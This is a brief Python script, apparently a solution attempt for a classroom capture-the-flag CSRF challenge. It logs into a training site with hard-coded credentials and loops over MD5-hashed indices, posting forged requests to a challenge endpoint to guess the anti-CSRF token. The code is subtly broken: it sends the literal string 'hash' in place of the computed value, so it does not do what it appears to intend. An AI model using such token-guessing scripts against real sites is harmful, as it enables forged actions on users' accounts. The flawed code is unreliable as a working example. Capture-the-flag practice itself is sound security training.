import requests, hashlib

loginpayload = {"login": "alexrose" , "pwd":"asdfqwerzxcv" }

session = requests.Session()

url = "http://cs495.oregonctf.org/login"

response = session.post(url, data=loginpayload)

for x in range(0,50):
    m = hashlib.md5()
    index = 'b"%d"' % (x)
    m.update(index.encode())
    hash = str(m.digest()).split("'")[1]
    targetUrl = "http://cs495.oregonctf.org/user/csrfchallengesix/plusplus"
    postData = {"userId":"80ab77a6722bdca67260da9e7ef0bbc8daf5a683",
                "csrfToken":"hash"}
    response2 = session.post(targetUrl, data=postData)
    print(response2.text)
